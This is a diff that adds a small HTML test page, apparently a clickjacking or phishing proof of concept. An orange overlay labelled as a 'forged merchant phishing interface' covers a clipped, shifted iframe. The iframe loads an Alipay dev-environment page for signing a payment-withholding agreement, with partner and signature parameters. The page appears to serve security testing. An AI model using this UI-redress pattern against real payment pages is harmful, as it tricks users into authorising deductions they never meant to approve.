@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>H5测试</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0"/>
+    <meta name="apple-mobile-web-app-capable" content="yes"/>
+    <meta name="apple-mobile-web-app-status-bar-style" content="black"/>
+    <meta name="format-detection" content="telephone=no,email=no"/>
+    <link rel="stylesheet" href="https://a.alipayobjects.com/g/antui/antui/10.0.18/dpl/antui.css">
+    <script src="https://a.alipayobjects.com/amui/zepto/1.1.3/zepto.js"></script>
+    <script src="https://as.alipayobjects.com/g/component/antbridge/1.1.3/antbridge.min.js"></script>
+</head>
+<body ontouchstart="">
+<style>
+    .diaoyu {
+        position: absolute;
+        left: 0;
+        z-index: 999;
+        width: 100%;
+        height: 60px;
+        background: #f60;
+    }
+    .iframe {
+        overflow: hidden;
+        width: 100%;
+        height: 300px;
+        position: relative;
+    }
+    .iframe iframe {
+        position: absolute;
+        left: -300px;
+        width: 800px;
+        height: 400px;
+    }
+</style>
+<div class="diaoyu" style="">这里是商户伪造钓鱼界面</div>
+<div class="iframe">
+    <iframe src="http://mdeduct-eu95-14.rz00b.dev.alipay.net/home/exterfaceAssign.htm?sales_product_code=GENERAL_WITHHOLDING&_input_charset=UTF-8&sign=c176cd7f10ba343fdeb37593e9c66925&third_party_type=PARTNER&notify_url=http%3A%2F%2Fapi.test.alipay.net%2Fatinterface%2Freceive_notify.htm&product_code=GENERAL_WITHHOLDING_P&sendFormat=normal&alipay_exterface_invoke_assign_model=customer&alipay_exterface_invoke_assign_target=customerAgreementSign.htm&scene=INDUSTRY%7CCARRENTAL&partner=2088102118949755&alipay_exterface_invoke_assign_sign=_cf8y_g1ve_dr2nr%2F7ket%2B_b9_qc_cyw_u_a_qrv5_puy7s649_jxc_y_qr_j5_jvvdcg%3D%3D&service=alipay.dut.customer.agreement.page.sign&return_url=www.alipay.com&provider_hostname=mdeduct-eu95-14.rz00b.dev.alipay.net&access_info=%7B%22channel%22%3A%22PC%22%7D&sign_type=MD5&external_sign_no=muhong_test_1214_001&alipay_exterface_invoke_assign_client_ip=127.0.0.1" frameborder="0"></iframe>
+</div>
+<script>
+</script>
+</body>
+</html>
